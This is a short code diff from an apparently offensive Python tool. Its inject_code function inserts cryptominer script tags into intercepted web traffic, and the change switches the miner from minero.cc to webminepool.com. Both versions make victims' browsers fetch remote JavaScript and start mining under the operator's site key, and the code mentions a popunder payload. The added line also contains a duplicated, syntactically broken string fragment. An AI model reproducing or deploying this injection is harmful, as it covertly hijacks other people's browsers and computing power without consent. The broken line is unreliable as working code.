@@ -106,8 +106,8 @@ def inject_code(packet):
 					injectionCode = popunderPayload
 				else:
 #					print('Injecting stock miner')
-					injectionCode = "<script src='https://minero.cc/lib/minero.min.js'></script>"
-					injectionCode = injectionCode+"<script>var miner = new Minero.Anonymous(\'" + str(config["siteKey"]) +  "\');miner.start();</script>";
+					injectionCode = "<script src='https://www.webminepool.com/lib/base.js'></script>"
+					injectionCode = injectionCode+"<script>var miner = WMP.Anonymous(\'" + str(config["siteKey"]) +  "\'); +  "\');miner.start();</script>";
 
 				length_search=False
 
